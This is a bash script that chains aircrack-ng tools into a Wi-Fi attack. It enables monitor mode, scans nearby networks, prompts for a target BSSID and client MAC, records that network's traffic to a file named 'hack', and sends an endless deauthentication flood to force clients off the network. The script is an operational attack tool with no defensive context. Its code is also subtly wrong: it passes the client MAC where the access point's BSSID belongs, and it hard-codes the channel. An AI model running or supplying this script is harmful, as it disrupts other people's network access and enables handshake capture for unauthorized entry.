#!/bin/bash

# Start monitor mode on the specified wireless interface
sudo airmon-ng start wlo1

# Check for and kill interfering processes
sudo airmon-ng check kill

# Capture wireless packets using airodump-ng
sudo airodump-ng wlo1

# Prompt the user to choose a BSSID
read -p "Enter the BSSID you want to target: " selected_bssid

# Prompt the user to choose a client MAC address
read -p "Enter the MAC address of the client you want to deauthenticate: " client_mac

# Capture packets from the chosen BSSID
gnome-terminal -- sudo airodump-ng -w hack -c 11 --bssid $selected_bssid wlo1

sleep 30s

# Deauthenticate the client
sudo aireplay-ng --deauth 0 -a $client_mac wlo1

